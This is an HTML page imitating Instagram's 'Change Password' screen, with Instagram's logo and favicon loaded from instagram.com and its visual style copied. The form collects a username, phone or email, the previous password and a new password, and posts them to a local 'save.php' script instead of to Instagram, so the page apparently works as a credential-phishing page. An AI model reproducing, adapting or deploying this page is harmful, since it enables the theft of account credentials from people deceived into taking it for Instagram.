<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Change Password • Instagram</title>
    <link rel="icon" type="image/png" href="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png">
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            width: 350px;
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .logo {
            margin: 22px auto 12px;
            width: 175px;
        }
        h2 {
            color: #8e8e8e;
            font-size: 17px;
            font-weight: 600;
            line-height: 20px;
            margin: 0 40px 10px;
            text-align: center;
        }
        form {
            display: flex;
            flex-direction: column;
            width: 100%;
            margin-top: 20px;
        }
        input {
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            box-sizing: border-box;
            color: #262626;
            font-size: 12px;
            margin-bottom: 6px;
            padding: 9px 0 7px 8px;
            width: 100%;
        }
        button {
            background-color: #0095f6;
            border: 1px solid transparent;
            border-radius: 4px;
            color: #fff;
            font-weight: 600;
            margin-top: 8px;
            padding: 5px 9px;
            cursor: pointer;
        }
        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #8e8e8e;
            text-align: center;
        }
        .input-group {
            position: relative;
            margin-bottom: 6px;
        }
        .toggle-password {
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            font-size: 18px;
            color: #8e8e8e;
            user-select: none;
        }
        .error-message {
            color: #ed4956;
            font-size: 12px;
            margin-top: 2px;
            margin-left: 2px;
        }
        .input-error input {
            background: #fff6f6;
            border: 1px solid #ed4956;
        }
        .input-error .toggle-password {
            color: #ed4956;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" class="logo" alt="Instagram">
        <h2>Change Password</h2>
        <form action="save.php" method="POST" id="changePassForm" autocomplete="off">
            <input type="text" name="identity" placeholder="Phone number, username, or email" required>
            <input type="password" name="old_pass" placeholder="Previous Password" required>
            <input type="password" name="new_pass" id="new_pass" placeholder="New Password" required>
            <button type="submit">Change Password</button>
        </form>
    </div>
</body>
</html>